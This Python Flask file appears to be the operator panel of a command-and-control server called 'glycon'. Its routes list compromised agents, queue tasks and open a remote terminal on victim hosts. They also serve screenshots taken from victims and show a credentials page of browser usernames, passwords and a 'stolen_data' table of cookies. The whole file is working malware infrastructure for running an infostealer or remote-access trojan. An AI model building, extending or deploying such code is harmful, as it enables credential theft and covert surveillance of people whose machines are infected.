from flask import render_template, request, flash, redirect, url_for, send_file, send_from_directory
from flask_login import login_required
import sqlite3
import io, json
from datetime import datetime
from glycon.config import CONFIG

def init_view_routes(app):
    @app.context_processor
    def inject_config():
        return dict(config=CONFIG)
    
    @app.route('/')
    @login_required
    def dashboard():
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM agents WHERE status == 'online'")
        agent_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'")
        pending_tasks = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM credentials")
        credential_count = c.fetchone()[0]
        
        c.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 5")
        recent_agents = [dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege'], row)) 
                        for row in c.fetchall()]
        
        
        c.execute('''
            CREATE INDEX IF NOT EXISTS idx_tasks_agent_status 
            ON tasks (agent_id, status)
        ''')

        c.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 5")
        recent_tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
                       for row in c.fetchall()]
        
        conn.close()
        
        return render_template('dashboard.html', 
                             agent_count=agent_count,
                             pending_tasks=pending_tasks,
                             credential_count=credential_count,
                             recent_agents=recent_agents,
                             recent_tasks=recent_tasks)

    @app.route('/settings')
    @login_required
    def settings():
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute('''SELECT checkin_interval, server_url, take_screenshots, screenshot_frequency, killdate_enabled, killdate, trusted_certificate
                     FROM agent_configurations ORDER BY id DESC LIMIT 1''')
        row = c.fetchone()
        conn.close()

        agent_config = None
        if row:
            agent_config = {
                'checkin_interval': row[0],
                'server_url': row[1],
                'take_screenshots': bool(row[2]),
                'screenshot_frequency': row[3],
                'killdate_enabled': bool(row[4]),
                'killdate': row[5],
                'trusted_certificate': bool(row[6])
            }

        return render_template('settings.html', CONFIG=CONFIG, agent_config=agent_config)

    @app.route('/agents')
    @login_required
    def agents():
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT * FROM agents ORDER BY last_seen DESC")
        agents = [dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege', 'ws_connected', 'killdate', 'checkin_interval'], row)) 
                  for row in c.fetchall()]

        c.execute('''SELECT checkin_interval, server_url, take_screenshots, screenshot_frequency, killdate_enabled, killdate, trusted_certificate
                     FROM agent_configurations ORDER BY id DESC LIMIT 1''')
        row = c.fetchone()
        conn.close()

        agent_config = None
        if row:
            agent_config = {
                'checkin_interval': row[0],
                'server_url': row[1],
                'take_screenshots': bool(row[2]),
                'screenshot_frequency': row[3],
                'killdate_enabled': bool(row[4]),
                'killdate': row[5],
                'trusted_certificate': bool(row[6])
            }

        return render_template('agents.html', agents=agents, agent_config=agent_config)

    @app.route('/agent/<agent_id>')
    @login_required
    def agent_detail(agent_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        c.execute("SELECT * FROM agents WHERE id=?", (agent_id,))
        agent_data = c.fetchone()
        if not agent_data:
            flash("Agent not found", "danger")
            return redirect(url_for('agents'))
        
        agent = dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege', 'ws_connected', 'killdate', 'checkin_interval'], agent_data))
        
        c.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 20", (agent_id,))
        tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
                 for row in c.fetchall()]
        
        c.execute("SELECT * FROM credentials WHERE agent_id=? ORDER BY timestamp DESC LIMIT 20", (agent_id,))
        creds = [dict(zip(['id', 'agent_id', 'browser', 'url', 'username', 'password', 'timestamp'], row)) 
                 for row in c.fetchall()]
        
        c.execute("SELECT id, timestamp FROM screenshots WHERE agent_id=? ORDER BY timestamp DESC LIMIT 5", (agent_id,))
        screenshots = [dict(zip(['id', 'timestamp'], row)) for row in c.fetchall()]
        
        conn.close()
        
        return render_template('agent_detail.html', 
                             agent=agent, 
                             tasks=tasks, 
                             creds=creds,
                             screenshots=screenshots)

    @app.route('/terminal/<agent_id>')
    @login_required
    def terminal(agent_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT * FROM agents WHERE id=?", (agent_id,))
        agent_data = c.fetchone()
        conn.close()
        
        if not agent_data:
            flash("Agent not found", "danger")
            return redirect(url_for('agents'))
        
        agent = {
            'id': agent_data[0],
            'hostname': agent_data[1],
            'ip': agent_data[2],
            'os': agent_data[3],
            'last_seen': agent_data[4],
            'status': agent_data[5],
            'privilege': agent_data[6],
            'ws_connected': False  # We'll update this later with actual status
        }
        
        return render_template('terminal.html', agent=agent)

    @app.route('/screenshot/<int:screenshot_id>')
    @login_required
    def get_screenshot(screenshot_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT image FROM screenshots WHERE id=?", (screenshot_id,))
        result = c.fetchone()
        conn.close()
        
        if not result or not result[0]:
            flash("Screenshot not found or empty", "danger")
            return redirect(url_for('screenshots'))
        
        return send_file(
            io.BytesIO(result[0]),
            mimetype='image/png',
            download_name=f"screenshot_{screenshot_id}.png"
        )

    @app.route('/screenshots')
    @login_required
    def screenshots():
        agent_id = request.args.get('agent_id')
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        if agent_id:
            c.execute('''SELECT s.id, s.timestamp, a.hostname, a.id as agent_id 
                         FROM screenshots s JOIN agents a ON s.agent_id = a.id 
                         WHERE s.agent_id=? ORDER BY s.timestamp DESC LIMIT 50''', (agent_id,))
        else:
            c.execute('''SELECT s.id, s.timestamp, a.hostname, a.id as agent_id 
                         FROM screenshots s JOIN agents a ON s.agent_id = a.id 
                         ORDER BY s.timestamp DESC LIMIT 50''')
        
        screenshots = [dict(zip(['id', 'timestamp', 'hostname', 'agent_id'], row)) 
                      for row in c.fetchall()]
        
        conn.close()
        return render_template('screenshots.html', screenshots=screenshots)

    @app.route('/credentials')
    @login_required
    def credentials():
        browser_filter = request.args.get('browser')
        
        # Query for regular credentials
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        if browser_filter:
            c.execute("SELECT * FROM credentials WHERE browser=? ORDER BY timestamp DESC", (browser_filter,))
        else:
            c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
        
        credentials = [dict(zip([col[0] for col in c.description], row)) for row in c.fetchall()]
        
        # Query for stolen cookies data
        c.execute('''SELECT id, agent_id, browser, system_info, timestamp 
                    FROM stolen_data 
                    WHERE data_type='cookies'
                    ORDER BY timestamp DESC''')
        
        cookies_data = []
        for row in c.fetchall():
            row_dict = dict(zip([col[0] for col in c.description], row))
            try:
                # Ensure system_info is properly decoded
                if isinstance(row_dict['system_info'], str):
                    # Try to parse as JSON
                    row_dict['system_info'] = json.loads(row_dict['system_info'])
                elif isinstance(row_dict['system_info'], bytes):
                    # Decode bytes first, then parse as JSON
                    row_dict['system_info'] = json.loads(row_dict['system_info'].decode('utf-8'))
                elif not row_dict['system_info']:
                    # Handle empty/None case
                    row_dict['system_info'] = {}
            except (json.JSONDecodeError, AttributeError, TypeError) as e:
                app.logger.error(f"Error parsing system_info: {str(e)}")
                row_dict['system_info'] = {}
            
            cookies_data.append(row_dict)
        
        conn.close()
        
        return render_template('credentials.html', 
                            credentials=credentials,
                            cookies_data=cookies_data,
                            browser_filter=browser_filter)

    @app.route('/tasks')
    @login_required
    def tasks():
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 100")
        tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
                 for row in c.fetchall()]
        conn.close()
        return render_template('tasks.html', tasks=tasks)
    
